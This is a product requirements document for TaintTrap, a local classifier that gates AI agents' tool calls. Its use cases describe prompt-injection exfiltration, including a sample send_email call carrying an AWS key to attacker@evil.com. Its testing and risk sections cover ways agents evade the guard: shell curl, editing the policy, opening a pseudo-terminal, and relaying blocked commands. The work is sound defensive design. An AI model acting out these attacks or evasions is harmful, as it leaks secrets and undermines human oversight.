Action Gate — PRD
Oct 10, 2026 · @Maria Rut Van Tinkeman
Summary and problem
TaintTrap checks every tool call an AI agent is about to make and answers allow, ask or block: does the call match what the user asked for, do its arguments carry secrets, should a human approve it. The check runs locally on a fine-tuned Laya model, with no data leaving the machine.
Problem. Agents read untrusted content (web pages, files, email, MCP server responses) and can be talked into leaking data or taking destructive actions. Detectors that scan documents for injected text are leaky by design: an attack can hide in the middle of a long document or be spread across its meaning. Having a large LLM review every step is slow and expensive.
Approach: check the consequence, not the cause. An injection only matters if it makes the agent do the wrong thing, and an action is always short: a tool and its arguments. The model sees the user's task, the action and where each argument came from. That is a few hundred tokens, however long the poisoned document was.
Positioning. Not another gateway or platform, but a fast semantic check of actions that plugs into existing gateways and agent frameworks, with published false-positive numbers.
Goals and non-goals
The MVP has to prove one thing: a small local model can stop at least 90% of unauthorized agent actions while letting at least 98% of normal actions through without a prompt.
MVP goals
• Ship an open-source package: an MCP proxy and a Claude Code hook.
• Fine-tune an action-checking model and publish honest metrics, per benchmark.
• Get the first external users and their feedback.
Non-goals
• Scanning long documents for injected text. TaintTrap judges actions, not inputs.
• Being an MCP gateway or an enterprise security platform. TaintTrap plugs into them.
• Catching manipulation inside permitted actions, such as the agent choosing the "wrong" vendor. This is a documented limit; human approval is recommended for such decisions.
• Sending dossiers or logs off the machine. The only exception is an LLM judge the user turns on explicitly.
• Team dashboard, SSO, and approvals in Slack or on the web. These come after the MVP.
Users and use cases
The first user is a developer running agents on their own machine who wants to sleep at night.
User
What they need
Developer using Claude Code, Cursor or a custom agent
Protection from leaked keys and destructive commands, without constant confirmations
Team building agents for customers
Control over actions in production; a log for audits
Security engineer
Policies, reports, provable false-positive rates
Gateway and framework developers
A ready, fast detector to add as a plugin
Use cases
1. The user asks "find reviews of restaurant X". A hidden instruction on a page makes the agent try to send ~/.aws/credentials to an outside address. TaintTrap sees that the address came from a tool response, the action doesn't match the task, and the arguments hold a secret: block.
2. The user asks "email the report to Ana". The call is external communication, but it matches the task and the address came from the user: allow, no prompt.
3. The agent wants to run rm -rf build/ during "rebuild the project". A deletion rule plus confident alignment with the task: allow or ask, depending on policy.
4. The model is unsure: the call goes to the LLM judge, and if it is still unsure, to a human.
5. Once a week the developer reviews the log (what was blocked, where it asked, which decisions were wrong) and flags mistakes for retraining.
Functional requirements
TaintTrap starts in observe mode by default: it logs what it would do and blocks nothing until the user turns protection on. Everything marked P0 ships in the MVP; P2 comes after it.
Modes
Mode
What it does
Observe (default)
Log only: what it would have blocked and what it would have asked about
Soft
Blocks only what is confidently dangerous; asks a human about the rest
Strict
Blocks everything that fails the check; unsure calls go to the LLM judge
Requirements
ID
Requirement
Priority
FR-1
MCP proxy intercepts tools/call, checks it before it reaches the server, and on a block returns an error to the agent with a clear reason
P0
FR-2
Claude Code hook (PreToolUse) returns allow, deny or ask, with a reason
P0
FR-3
Dossier assembly: user task, tool from the trusted registry, arguments, provenance of each argument, recent actions
P0
FR-4
Provenance tracking: values from tool responses are marked untrusted; an argument that matches a fragment of an untrusted response gets the untrusted label
P0
FR-5
Rules engine: regexes for secrets (cloud keys, tokens, private keys), allow and deny lists for domains and commands, budgets
P0
FR-6
Policy in YAML: thresholds, actions per risk class, mode
P0
FR-7
Pluggable LLM judge for unsure cases (API or local model); can be turned off
P0
FR-8
Human approval in the terminal
P0
FR-9
JSON log: dossier (secrets masked), model answers, decision, model version, timestamp
P0
FR-10
Command to flag a wrong decision; the example goes into a local dataset for retraining
P0
FR-11
Tool registry: built-in catalog of popular tools and MCP servers, plus user-supplied descriptions
P0
FR-12
Failure-mode switch when the model is down: fail-open (allow and log) or fail-closed (ask a human)
P0
FR-13
Human approval in Slack and on the web
P2
FR-14
Team dashboard: logs from all agents, reports, audit; centralized team policies and SSO
P2
User experience and core flows
TaintTrap sits between the agent and its tools: before a tool runs, it builds a short dossier for the call, runs it through rules and the model, and answers allow, ask or block.
Rules decide in milliseconds, the model handles most of the rest locally, and only unsure calls reach the judge or a human. In observe mode, the default, these outcomes are logged but not enforced; the policy (FR-6) sets the thresholds.
Where it intercepts
• MCP proxy. Sits between the agent and its MCP servers and catches every tools/call. Works with any MCP agent without code changes.
• SDK hooks. The check runs from the "before tool call" event, such as PreToolUse in Claude Code and the Claude Agent SDK. Our own Claude Code agents are the first proving ground.
What people see
• On a block, the agent gets an error with a plain reason, so it can tell the user or try another way (FR-1, FR-2).
• On an ask, the human approves or denies in the terminal (FR-8).
• A report command and a flag command support the weekly review in use case 5 (FR-10, NFR-16).
Components
• Tool registry: trusted tool descriptions and their risk class. Descriptions from MCP servers are not used, because they can be poisoned.
• Provenance tracking: marks whether each argument came from the user's request or from a tool response. The strongest attack signal.
• Rules engine: regexes for keys and tokens, domain allow lists, budgets, bans.
• Classifier: the fine-tuned Laya in ONNX, on CPU or GPU.
• LLM judge: fallback for unsure cases, configurable as a local model or an API.
• Log: JSON decisions for audit and retraining.
Principle. The core (dossier, rules, model, policy) doesn't depend on how calls are intercepted; the proxy and hooks are adapters.
Detection model and data
We fine-tune the English Laya (ModernBERT-large, 421M parameters, Apache 2.0), because agent tools and arguments are almost always English or code; the multilingual version is a candidate to compare. The base model is never used as-is: without fine-tuning it scores only 0.698 on a held-out injection test.
Context. The English version defaults to 512 tokens, but a dossier takes up to 1–2K, so fine-tuning raises max_len to 2048 (the ModernBERT encoder supports 8192). Long arguments such as an email body or file contents are truncated, keeping the start and the end.
Input (state)
{
  "user_task": "Find reviews of restaurant X and send me a summary",
  "tool": "send_email",
  "tool_risk_class": "external_communication",
  "args": {"to": "attacker@evil.com", "body": "AKIA..."},
  "untrusted_fields": ["args.to", "args.body"],
  "recent_actions": ["web_search", "fetch_page", "read_file"]
}
Questions, answered in one pass
Code
Type
Question
aligned
probability (noul)
Does the action match the user's task?
risk
choice
read_only / write_internal / external_communication / destructive / financial / credential_access
sensitive_data
probability (noul)
Do the arguments contain secrets or personal data?
needs_human
probability (noul)
Should a human be asked?
Training labels use the Laya notebook's format (labels plus probabilities; soft labels allowed).
Policy combines answers and rules. For example: aligned < 0.2, or an untrusted recipient with risk = external_communication, means block; 0.2 ≤ aligned < 0.8 goes to the LLM judge; anything else is allowed. Thresholds are set after calibration.
Dataset. Version 1 has 4,000 training and 500 test examples: open agent trajectories converted into dossiers, plus our own synthetic data for hard normal cases and missing classes. Labels come from attack success conditions and are set at generation time.
Class
Share
Example
Normal actions
45%
Task "show the logs" → read_file(logs/app.log)
Hard normal actions
20%
The user explicitly asks to send an email out, delete a folder, pay
Secret and data exfiltration
12%
Keys, tokens, personal data in arguments to an outside recipient
Unauthorized external communication
8%
An email, request or post the user never asked for
Destructive actions
8%
Delete, overwrite, force push, DROP TABLE outside the task
Money and permissions
7%
Payments, permission changes, key creation outside the task
Open datasets
Dataset
What's inside
Role
DTap agent trajectories
Trajectories in MCP environments (Salesforce, Gmail, PayPal, Slack, GitHub, terminal), Apache 2.0
Training, main source
Agent Security Bench (ASB)
16 attack types, 10 scenarios, 400+ tools
Training
ToolSafety (EMNLP 2025)
Tool-call safety
Training
InjecAgent
1,054 indirect injection tests
Test
AgentDojo
97 tasks, 629 security tests
Test
A3S-Bench
424 benign dialogs, 726 attacks, including multi-step
Test
agent-injection-bench
MIT, machine-checkable attack success, over-refusal control
Test: false-positive metric
MCP-SafetyBench, MCP Security Bench, MCPTox
MCP attacks, including poisoned tool descriptions
Test
Synthetic generation with Claude Code
1. A catalog of 40–60 common tools: files, shell, git, email, HTTP, databases, payments, calendar, Slack.
2. For each tool, scenarios of "user task → correct sequence of actions".
3. For some scenarios, an attack: an instruction is mixed into a tool response and the agent takes the wrong action. Training needs only the final action and argument provenance, so the attack text itself can be anything.
4. Hard normal cases: the same tools, but the user explicitly asked for the action.
Data rules
• Train and test split by tool family and task template, not at random; otherwise the model memorizes templates and metrics are inflated.
• Training and test sets never overlap; test sets are not used even to tune thresholds.
• Each open dataset's license is checked for commercial use before it enters training.
• Quality control: a second opinion from Codex on borderline examples, manual review of disagreements and of all 500 test examples, near-duplicate removal, and real traces from our own Claude Code agents as hard normal cases and a final false-positive check.
Training. On free 2×T4 GPUs in Kaggle, using the official Laya notebook with these changes:
What
In the notebook
Ours
Data
typed-decisions dataset
Our JSONL of action dossiers
Context
1024
2048
Calibration
On part of the training data
On a separate validation set
Publishing
Public on Hugging Face
Private first, public at release
Metrics
typed-decisions benchmark
Our own security metrics
Baselines: rules only; an LLM judge on every step (slow and expensive, but sets the quality ceiling); existing open detectors on the same test where they apply.
Retraining loop. On errors from real users' logs (with their consent) and new attack classes. A new version first runs in observe mode next to the old one.
Non-functional requirements
The properties that matter most are locality, speed, and making sure the guard itself does not become a new hole.
Performance
• NFR-1. Check latency ≤ 500 ms p95 on a laptop CPU, ≤ 100 ms on GPU. A tool call usually takes seconds, so this is acceptable.
• NFR-2. Model in ONNX (FP16 on GPU, quantized on CPU); memory ≤ 1.5 GB.
• NFR-3. Rules run before the model and take milliseconds; the model runs only when rules give no final answer.
Privacy
• NFR-4. Everything runs locally; dossiers and logs never leave the machine. The LLM judge is the only exception, and the user turns it on explicitly.
• NFR-5. Secrets are masked in the log.
• NFR-6. No telemetry by default.
Security of TaintTrap itself
• NFR-7. The proxy keeps MCP server credentials no longer than needed.
• NFR-8. Policy configuration is out of the agent's reach: the agent cannot disable the check through its own tools.
• NFR-9. Tool descriptions come only from the trusted registry, never from MCP servers, whose descriptions can be poisoned.
Supply chain
• NFR-10. Models load only as safetensors (never pickle), with a pinned version and hash check.
• NFR-11. Open datasets only with clear provenance (academic publications, known organizations) and a pinned version; our own synthetic data is the dataset's core.
• NFR-12. Before every model release, a hidden-trigger test: a harmless phrase must never flip a decision to "safe".
• NFR-13. Package dependencies are pinned; MCP libraries and servers are updated only after review.
Compatibility
• NFR-14. Python 3.10+, macOS, Linux (x86 and ARM, including Jetson), Windows through WSL.
• NFR-15. Install with one pip install; start the proxy with one command.
Observability
• NFR-16. Structured log and a report command: how many calls were checked, blocked, asked about, sent to the judge, flagged as mistakes.
Success metrics
Release is gated on three numbers: at least 90% of attacks blocked, at least 98% of normal actions allowed without a prompt, and no more than 10% of decisions sent to the LLM judge.
Metric
Target
Measured on
Attacks blocked (unauthorized actions)
≥ 90%
Own test set and held-out open benchmarks
Normal actions allowed without a prompt
≥ 98%
Real agent traces
Decisions sent to the LLM judge
≤ 10%
Own test set and held-out open benchmarks
Check latency
≤ 500 ms p95 on CPU, ≤ 100 ms on GPU
Developer laptop, Jetson
GitHub stars 3 months after release
≥ 500
GitHub
Teams using it in their work
≥ 10
Feedback, issues
Release bar. The first three targets must hold on our own test set and on held-out open benchmarks (InjecAgent, AgentDojo, A3S-Bench, agent-injection-bench, the MCP sets). Results are published for each benchmark separately.
Also tracked: block rate per attack class; pass rate on hard normal cases; share of decisions sent to the judge and to a human; confidence calibration (ECE); latency p50 and p95 on a laptop CPU and on Jetson.
Testing
TaintTrap is tested at seven levels, from cheap to expensive. The deciding one is the last: false positives on real traces, which synthetic data cannot show.
Level
What we check
Pass criterion
Runs
1. Unit: rules and provenance
Real secret formats (AWS keys, GitHub and Slack tokens, private keys) plus look-alikes such as hashes and UUIDs; the untrusted label on values from tool responses, including base64, URL-encoded, partial and case-changed values
Known formats caught, no look-alike flagged; limits on transformed values documented
Every commit, CI
2. Golden set
30–50 hand-written scenarios like the use cases above, each with its expected decision
Every decision matches
Every release
3. Integration
MCP proxy with a fake MCP server; Claude Code hook input and output; model crash and timeout
A blocked call never reaches the server and the agent gets a reason; fail-open and fail-closed behave as configured
Every commit, CI
4. Model offline
Own 500-example test and held-out benchmarks, against the three baselines
Release bar from Success metrics, reported with confidence intervals
Every model version
5. End-to-end with an agent
AgentDojo run twice with a real agent, with and without TaintTrap
Attack success drops; task completion barely changes
Every model version
6. Attacks on TaintTrap
Bypass around the proxy through shell curl; the agent editing policy or stopping the process; an adaptive attacker on the open weights; hidden triggers (NFR-12)
The hook catches shell calls; config is out of reach; bypasses of the model are caught by provenance and secret rules or become training examples
Before every release
7. Real traces
Observe mode on our own Claude Code agents, every would-block and would-ask reviewed by hand; a new model version shadows the old one
≥ 98% of normal actions pass, measured on at least 750 of them
1–2 weeks of dogfooding, then the beta
Sample sizes. If the test set mirrors the training mix, it holds about 175 attacks, so a 90% block rate on it carries roughly ±4–5 points at 95% confidence. A single class, such as 40 destructive actions, carries about ±9 points, so per-class claims rest on the benchmarks. Estimating a 2% false-positive rate within ±1 point takes about 750 normal actions.
The headline number. Offline labels don't show how many tasks the agent stops completing. The AgentDojo pair (attack success and task completion, each with and without TaintTrap) goes into the release write-up.
Rollout plan and milestones
Public release is about 8 weeks from start, and every phase ends at an exit gate.
The main schedule risk is that false positives on real work run higher than on synthetic data. Then dogfooding stretches, because there is no release below 98%.
Build in public from week 1. A short weekly post on what shipped, which attacks were caught and where it was wrong builds an audience for the release at no cost.
Positioning
The market is hot and crowded, so TaintTrap positions as a fast semantic detector of actions that plugs into other people's gateways, not as another gateway or platform.
Who
What they do
How we differ
LlamaFirewall (Meta, open source)
PromptGuard 2, LLM-based alignment checks, CodeShield
Same idea of checking actions, but a local model in milliseconds instead of LLM reasoning
NeMo Guardrails (NVIDIA)
Programmable rails, tool-call checks
We can be a detector inside NeMo
LLM Guard (Protect AI)
20+ input and output scanners, ~50 ms
Scans text; we check the action and argument provenance
mcp-firewall, Aperion Shield, OpenFirma
Gateways and deterministic policies at the MCP and call level
We don't compete as a gateway; we add the semantic layer as a plugin
MintMCP, TrueFoundry
Managed MCP gateways with guardrails
Same as above
actiongate-oss/actiongate (PyPI `actiongate`)
Deterministic pre-execution gating of agent tool calls: rate limits and call quotas
Counts and caps calls; we judge whether a call fits the task and where its data goes. The name clash is why this project is TaintTrap (decision 0001)
rootfs/tool-call-verifier (Hugging Face, Apache 2.0)
ModernBERT-base classifier: is a tool call's text consistent with the user's request (labels every token AUTHORIZED or UNAUTHORIZED; trained on LLMail-Inject, WildJailbreak, HackAPrompt, JailbreakBench and synthetic attacks)
Closest open model to ours, but it sees only the request and the call: no tool output, no provenance, no earlier steps. On our detection benchmark it flags every shell command, benign ones included (2026-10-11)
agent-bouncer (PyPI)
Policy enforcement for agent spending: blocks transactions that break a declarative policy, signed audit log
Money only; we cover exfiltration, unauthorized recipients, destructive and credential actions, and treat spending as one risk class
Palo Alto (Protect AI), Check Point (Lakera), CrowdStrike (Pangea), Cato (Aim), F5 (CalypsoAI), Zenity
Enterprise platforms
Not competitors: platforms that TaintTrap can plug into
Positioning line: "Checks the consequence, not the cause: fast, local, semantic control of every agent action, with honest false-positive numbers."
Differentiators
• Checks the action and argument provenance instead of scanning long documents, so hidden and spread-out injections don't help the attacker.
• Milliseconds, local, no data sent out.
• Calibrated confidence: unsure calls go to a judge or a human.
• Open methodology and public false-positive metrics, the number this market cares about most.
Sources: awesome-ai-agent-governance, DEV guardrails tools review, open-source agent governance tools, agent security market map. Landscape as of September 2026.
Risks, dependencies and open questions
The most dangerous risk is false positives: people turn off a guard that gets in their way within a week.
Risk
Likelihood
Mitigation
Many false positives on real work
High
Hard normal examples, dogfooding on our own agents, observe mode by default, release only at ≥ 98%
Synthetic data doesn't look like real attacks
Medium
Open trajectories for training, held-out benchmarks for testing, retraining on errors
Targeted bypass of the open model (attacker knows the weights)
Medium
Deterministic provenance and secret rules don't depend on the model; LLM judge as a second layer; security doesn't rely on secrecy
Poisoned open data or models
Low–medium
Only datasets with clear provenance, our own data as the core, trigger tests, safetensors and hashes (NFR-10 to NFR-13)
A dataset license forbids commercial use
Medium
Check before inclusion; such sets are used for testing only
Manipulation within permitted actions (agent picks the "wrong" vendor)
High
Can't be caught by checking actions; stated in the docs, with human approval recommended for important decisions
Dossier doesn't fit the context window
Low
2048 tokens, long arguments truncated keeping start and end
Attack on TaintTrap itself (disabling it through agent tools)
Medium
Config out of the agent's reach, optional fail-closed
Indirect execution through task runners (make, npm run, just)
Medium
Recipes are expanded one level at check time and checked like any command; an agent that edits the Makefile between check and run, or nests targets, still gets through (documented limit)
Poisoned data in tools the agent trusts (address book, CRM) rather than injected instructions
High
Small models ignore injected instructions but believe poisoned data; recipients from the user's own address book are asked about, third-party sources stay blocked, approved recipients are remembered; the model learns to check that an address fits the named person
The agent hands a blocked command to the human ("run this by hand"), turning the attack into social engineering
Medium
TaintTrap checks actions, not the text of the agent's answers (documented limit). The block message tells the agent not to relay the command, the human is told what was blocked and why, and the relay rate is measured in the local-agent benchmark
Blocking a whole compound command loses its harmless parts (`cd svc && curl … && make deps`), so the task fails under protection
Medium
TaintTrap cannot run part of a command, because later parts may depend on earlier ones. Each part of a blocked compound command is checked on its own, and the block message names the blocked part and the parts that would pass, so the agent can rerun the rest
Dependencies: the Laya base model and Kaggle notebook; the MCP protocol and Claude Code's PreToolUse hook; licenses of the open datasets; Claude Code and Codex subscriptions for data generation and review.
Decisions
Recipients that come from tools (Oct 10, 2026). An address the agent looked up is a tool response, just like a poisoned one, so provenance alone cannot tell them apart. Default: ask, not block. Tools carry a trust tier in the registry: the user's own address book is first party (ask), while CRM, inbox, web and repositories are third party (block), because outsiders can write to them. A recipient the human approved once is remembered and not asked again; a new or poisoned address is still asked. Whether an address fits the person the user named ("Ana" vs digest@reviews-hub.example) is the model's job, and the contact pairs become training examples.
Headless confirmation (Oct 10, 2026). Without a GUI notifier, TaintTrap never shows a confirmation code on a terminal, because an agent can open a pseudo-terminal. Policy reloads and daemon approvals are refused instead; the user edits the owner-only policy file and restarts the daemon. The headless tier is weaker in convenience only, not in protection.
Open questions
[x] Final name: TaintTrap (`tainttrap` on PyPI, `Alexli18/tainttrap` on GitHub); see docs/design/decisions/0001-project-name-tainttrap.md.
[ ] Check the open datasets' licenses for commercial use.
[ ] English or multilingual Laya: compare on the test set.
[ ] Whether a business needs to be registered before the first consulting contract.